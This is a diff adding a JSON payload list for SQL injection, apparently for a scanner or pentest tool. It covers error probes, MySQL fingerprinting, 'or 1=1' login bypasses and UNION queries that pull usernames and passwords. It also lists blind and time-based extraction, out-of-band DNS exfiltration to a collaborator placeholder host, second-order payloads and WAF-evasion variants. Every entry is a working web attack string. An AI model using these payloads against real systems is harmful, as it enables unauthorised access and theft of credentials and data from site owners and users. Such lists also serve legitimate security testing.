@@ -1,0 +1,156 @@
+{
+  "category": "SQL Injection",
+  "keyword": "generic",
+  "payloads": [
+    {
+      "type": "Entry Point Detection",
+      "tech": ["vulnerability_detection"],
+      "payload": "'",
+      "description": "Single quote to trigger SQL errors"
+    },
+    {
+      "type": "Entry Point Detection",
+      "tech": ["vulnerability_detection"],
+      "payload": "%27",
+      "description": "URL-encoded single quote"
+    },
+    {
+      "type": "Entry Point Detection",
+      "tech": ["vulnerability_detection"],
+      "payload": "1' or 1=1 --",
+      "description": "Tautology-based detection"
+    },
+    {
+      "type": "DBMS Identification",
+      "tech": ["fingerprinting"],
+      "payload": "conv('a',16,2)=conv('a',16,2)",
+      "description": "MySQL identification payload"
+    },
+    {
+      "type": "DBMS Identification",
+      "tech": ["fingerprinting"],
+      "payload": "connection_id()=connection_id()",
+      "description": "MySQL-specific function test"
+    },
+    {
+      "type": "DBMS Identification",
+      "tech": ["fingerprinting"],
+      "payload": "crc32('MySQL')=crc32('MySQL')",
+      "description": "MySQL CRC32 function test"
+    },
+    {
+      "type": "Authentication Bypass",
+      "tech": ["authentication_bypass"],
+      "payload": "' or 1=1 --",
+      "description": "Classic authentication bypass"
+    },
+    {
+      "type": "Authentication Bypass",
+      "tech": ["authentication_bypass"],
+      "payload": "' or 1=1 limit 1 --",
+      "description": "Bypass with LIMIT to avoid multiple results"
+    },
+    {
+      "type": "Authentication Bypass",
+      "tech": ["authentication_bypass", "hash_exploit"],
+      "payload": "ffifdyop",
+      "description": "Raw MD5 hash that evaluates to 'or'6... when used with binary output"
+    },
+    {
+      "type": "UNION Based Injection",
+      "tech": ["data_exfiltration"],
+      "payload": "1' UNION SELECT username, password FROM users --",
+      "description": "Basic UNION-based data extraction"
+    },
+    {
+      "type": "Error Based Injection",
+      "tech": ["error_based"],
+      "payload": "AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -",
+      "description": "MySQL error-based version extraction"
+    },
+    {
+      "type": "Boolean Based Blind",
+      "tech": ["blind"],
+      "payload": "1 AND LENGTH(@@hostname)=N --",
+      "description": "Hostname length detection"
+    },
+    {
+      "type": "Boolean Based Blind",
+      "tech": ["blind"],
+      "payload": "1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --",
+      "description": "Hostname character extraction"
+    },
+    {
+      "type": "Time Based Injection",
+      "tech": ["time_based", "blind"],
+      "payload": "1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --",
+      "description": "MySQL version check with time delay"
+    },
+    {
+      "type": "Out of Band",
+      "tech": ["oob_exfiltration"],
+      "payload": "LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')",
+      "description": "DNS exfiltration via file read"
+    },
+    {
+      "type": "Stacked Injection",
+      "tech": ["command_execution"],
+      "payload": "1; SELECT SLEEP(5); --",
+      "description": "Stacked query with time delay"
+    },
+    {
+      "type": "Polyglot Injection",
+      "tech": ["waf_bypass"],
+      "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+      "description": "Multi-context payload"
+    },
+    {
+      "type": "Routed Injection",
+      "tech": ["data_exfiltration"],
+      "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#",
+      "description": "Hex-encoded secondary query (decodes to: ' union select 1,2#)"
+    },
+    {
+      "type": "Second Order Injection",
+      "tech": ["stored_injection"],
+      "payload": "anything' UNION SELECT Username, Password FROM Users;--",
+      "description": "Stored payload for later execution"
+    },
+    {
+      "type": "WAF Bypass - Whitespace",
+      "tech": ["waf_bypass"],
+      "payload": "?id=1%09and%091=1%09--",
+      "description": "Tab-separated payload"
+    },
+    {
+      "type": "WAF Bypass - Whitespace",
+      "tech": ["waf_bypass"],
+      "payload": "?id=1%0Aand%0A1=1%0A--",
+      "description": "Newline-separated payload"
+    },
+    {
+      "type": "WAF Bypass - No Comma",
+      "tech": ["waf_bypass"],
+      "payload": "LIMIT 1 OFFSET 0",
+      "description": "Alternative to LIMIT 0,1"
+    },
+    {
+      "type": "WAF Bypass - No Equal",
+      "tech": ["waf_bypass"],
+      "payload": "SUBSTRING(VERSION(),1,1) LIKE '5'",
+      "description": "LIKE operator instead of equals"
+    },
+    {
+      "type": "WAF Bypass - Case Modification",
+      "tech": ["waf_bypass"],
+      "payload": "aNd 1=1",
+      "description": "Mixed case keyword bypass"
+    },
+    {
+      "type": "WAF Bypass - Operators",
+      "tech": ["waf_bypass"],
+      "payload": "1 && 1=1",
+      "description": "Alternative to AND operator"
+    }
+  ]
+}
